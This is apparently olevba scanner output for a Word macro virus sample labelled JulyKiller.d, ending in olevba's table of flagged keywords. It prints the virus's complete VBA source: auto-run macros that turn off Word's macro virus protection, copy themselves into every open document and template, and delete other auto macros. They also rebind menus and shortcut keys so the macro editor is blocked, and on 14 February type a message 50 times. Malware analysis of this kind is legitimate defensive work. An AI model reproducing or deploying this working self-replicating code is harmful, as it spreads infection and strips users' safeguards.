olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.JulyKiller.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.JulyKiller.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO lcm.bas 
in file: ./Virus.MSWord.JulyKiller.d - OLE stream: 'Macros/VBA/lcm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
    Dim file$               '打开文件文件名
    Dim ans$          '保存回答的字符串
    Dim test           '回答提问的次数
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '打开文档
    Dim aTemp              '打开模板
    Dim vset           '感染病毒为1
    Dim Iset           '存在文件为1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "\lcm.dot"
    
    '取消宏病毒防护
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'检查文件是否感染病毒
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '检查模板是否感染病毒
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       '如果没有感染病毒，则感染所有打开的文档和模板。
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       '终止自动宏运行
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'检查是否有lcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'没有lcm.dot 文件，则建立一个。

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'移去文件原有的autoopen,autonew,autoclose,filesave宏。
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'移去模板原有的autoopen,autonew,autoclose,filesave宏。
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'感染所有打开的文件。
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'感染所有打开的模板。
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'与宏、Visual Basic 、模板与载项等有关的快捷键、菜单选择项、工具条自动关闭。
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "自定义(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "模板和加载项(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "选项(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "宏(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "宏(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic 编辑器(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    




exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub


Sub AutoExit()
    Dim file$               '打开文件文件名
    Dim ans$          '保存回答的字符串
    Dim test           '回答提问的次数
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '打开文档
    Dim aTemp              '打开模板
    Dim vset           '感染病毒为1
    Dim Iset           '存在文件为1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "\lcm.dot"
    
    '取消宏病毒防护
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'检查文件是否感染病毒
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '检查模板是否感染病毒
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       '如果没有感染病毒，则感染所有打开的文档和模板。
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       '终止自动宏运行
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'检查是否有lcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'没有lcm.dot 文件，则建立一个。

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'移去文件原有的autoopen,autonew,autoclose,filesave宏。
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'移去模板原有的autoopen,autonew,autoclose,filesave宏。
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'感染所有打开的文件。
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'感染所有打开的模板。
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'与宏、Visual Basic 、模板与载项等有关的快捷键、菜单选择项、工具条自动关闭。
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "自定义(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "模板和加载项(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "选项(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "宏(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "宏(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic 编辑器(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    

exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub


Sub AutoOpen()

    Dim file$               '打开文件文件名
    Dim ans$          '保存回答的字符串
    Dim test           '回答提问的次数
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '打开文档
    Dim aTemp              '打开模板
    Dim vset           '感染病毒为1
    Dim Iset           '存在文件为1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "lcm.dot"
    
    '取消宏病毒防护
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'检查文件是否感染病毒
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '检查模板是否感染病毒
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       '如果没有感染病毒，则感染所有打开的文档和模板。
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       '终止自动宏运行
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'检查是否有lcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'没有lcm.dot 文件，则建立一个。

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'移去文件原有的autoopen,autonew,autoclose,filesave宏。
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'移去模板原有的autoopen,autonew,autoclose,filesave宏。
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'感染所有打开的文件。
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'感染所有打开的模板。
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'与宏、Visual Basic 、模板与载项等有关的快捷键、菜单选择项、工具条自动关闭。
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "自定义(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "模板和加载项(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "选项(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "宏(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "宏(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic 编辑器(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    

pun:
    If WordBasic.Month(WordBasic.Now()) = 2 And WordBasic.Day(WordBasic.Now()) = 14 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
Selection.TypeParagraph
For I = 1 To 50
    Selection.TypeParagraph
    Selection.TypeText Text:="HI，你好！ "
    Selection.TypeParagraph
    Selection.TypeText Text:="  今天是情人节，我又想起了那船，那河和在那条河和船上遇到的一个曾想为之生为之死的女孩，还有一条自已现在无能为力要换回的项链......"
    Selection.TypeParagraph
Next I
End If
Selection.TypeParagraph


exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub



Sub AutoNew()
    Dim file$               '打开文件文件名
    Dim ans$          '保存回答的字符串
    Dim test           '回答提问的次数
    Dim path$
    Dim fpath$
    Dim mItem
    Dim cItem
    Dim aDoc               '打开文档
    Dim aTemp              '打开模板
    Dim vset           '感染病毒为1
    Dim Iset           '存在文件为1
    Dim ad
    


    For Each ad In AddIns
    If ad.Name = "lcm.dot" Then
        ad.Installed = False
    End If
Next ad

path = Options.DefaultFilePath(wdUserTemplatesPath)
fpath = path + "\lcm.dot"
    
    '取消宏病毒防护
    If Options.VirusProtection Then
        Options.VirusProtection = False
    End If
    
'检查文件是否感染病毒
    file$ = WordBasic.[MacroFileName$]()
    If InStr(file$, "lcm") <> 0 Then
        For Each aDoc In Documents
        For Each cItem In aDoc.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
        Next aDoc
  '检查模板是否感染病毒
        For Each cItem In NormalTemplate.VBProject.VBComponents
        If (cItem.Name = "lcm") Then
            vset = 1
        End If
        Next cItem
       '如果没有感染病毒，则感染所有打开的文档和模板。
        If vset <> 1 Then
        WordBasic.DisableAutoMacros       '终止自动宏运行
        Documents.Open FileName:=fpath, AddToRecentFiles:=False
        For Each aDoc In Documents
            If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aDoc.FullName + ":lcm"
            End If
        Next aDoc
        For Each aTemp In Templates
            If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
                    WordBasic.MacroCopy ActiveDocument.FullName + ":lcm", aTemp.FullName + ":lcm"
            End If
        Next aTemp
        ActiveDocument.Save
        ActiveDocument.Close
        End If
        If vset = 1 Then
            GoTo out
        End If
End If

'检查是否有lcm.dot
    With Application.FileSearch
.LookIn = path
.FileName = "lcm.dot"
    If .Execute > 0 Then
          Iset = 1
    End If
End With

'没有lcm.dot 文件，则建立一个。

    If Iset <> 1 Then
        WordBasic.DisableAutoMacros
        Documents.Add NewTemplate:=True
        WordBasic.MacroCopy file$ + ":lcm", ActiveDocument.FullName + ":lcm"
        ActiveDocument.SaveAs FileName:=fpath, AddToRecentFiles:=False
        ActiveDocument.Close
    End If

'移去文件原有的autoopen,autonew,autoclose,filesave宏。
    For Each aDoc In Documents
        If (file$ <> aDoc.FullName) And (aDoc.VBProject.Protection = 0) Then
            For Each cItem In aDoc.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aDoc.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aDoc

'移去模板原有的autoopen,autonew,autoclose,filesave宏。
    For Each aTemp In Templates
        If (file$ <> aTemp.FullName) And (aTemp.VBProject.Protection = 0) Then
            For Each cItem In aTemp.VBProject.VBComponents
                If (cItem.Name = "AutoOpen") Or (cItem.Name = "AutoNew") Or (cItem.Name = "AutoClose") Or (cItem.Name = "FileSave") Then
                    aTemp.VBProject.VBComponents.Remove (cItem)
                End If
            Next cItem
        End If
Next aTemp

'感染所有打开的文件。
    For Each aDoc In Documents
        If (InStr(aDoc.FullName, Application.PathSeparator) <> 0) And (aDoc.VBProject.Protection = 0) Then
             WordBasic.MacroCopy file$ + ":lcm", aDoc.FullName + ":lcm"
        End If
Next aDoc

'感染所有打开的模板。
    For Each aTemp In Templates
        If (InStr(aTemp.FullName, Application.PathSeparator) <> 0) And (aTemp.VBProject.Protection = 0) Then
              WordBasic.MacroCopy file$ + ":lcm", aTemp.FullName + ":lcm"
        End If
    Next aTemp


'与宏、Visual Basic 、模板与载项等有关的快捷键、菜单选择项、工具条自动关闭。
out:
    CustomizationContext = NormalTemplate
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF8))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF11))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="FileSaveAs"
       Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF1))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ToolsMacro"
    Set myKey = FindKey(BuildKeyCode(wdKeyAlt, wdKeyF2))
    myKey.Rebind KeyCategory:=wdKeyCategoryCommand, Command:="ViewVBCode"
    
    For Each mItem In CommandBars("Tools").Controls
    If mItem.Caption = "自定义(&C)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "模板和加载项(&I)..." Then
        mItem.OnAction = "AutoClose"
    End If
    If mItem.Caption = "选项(&O)..." Then
        mItem.OnAction = "AutoClose"
    End If
    Next mItem
    For Each cItem In CommandBars("Tools").Controls
    If cItem.Type = msoControlPopup Then
        If cItem.Caption = "宏(&M)" Then
            For Each mItem In cItem.CommandBar.Controls
                If mItem.Caption = "宏(&M)..." Then
                    mItem.OnAction = "AutoClose"
                End If
                If mItem.Caption = "Visual Basic 编辑器(&V)" Then
                    mItem.OnAction = "AutoClose"
                End If
            Next mItem
        End If
    End If
    Next cItem
    For Each cItem In CommandBars("Visual Basic").Controls
    cItem.OnAction = "AutoClose"
    Next cItem
    
    For Each cItem In CommandBars
    If cItem.Visible = True Then
        cItem.Protection = msoBarNoCustomize
    End If
    Next cItem
    
    WordBasic.FileSaveAll 1, 1
    

pun:
    If WordBasic.Month(WordBasic.Now()) = 2 And WordBasic.Day(WordBasic.Now()) = 14 Then
try:
        On Error GoTo -1: On Error GoTo 0
        On Error GoTo -1: On Error GoTo try
Selection.TypeParagraph
For I = 1 To 50
    Selection.TypeParagraph
    Selection.TypeText Text:="HI，你好！ "
    Selection.TypeParagraph
    Selection.TypeText Text:="  今天是情人节，我又想起了那船，那河和在那条河和船上遇到的一个曾想为之生为之死的女孩，还有一条自已现在无能为力要换回的项链......"
    Selection.TypeParagraph
Next I
End If
Selection.TypeParagraph


exit_:
    For Each myTask In Tasks
        If InStr(myTask.Name, "Visual Basic") > 0 Then
            myTask.Visible = False
        End If
    Next myTask
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

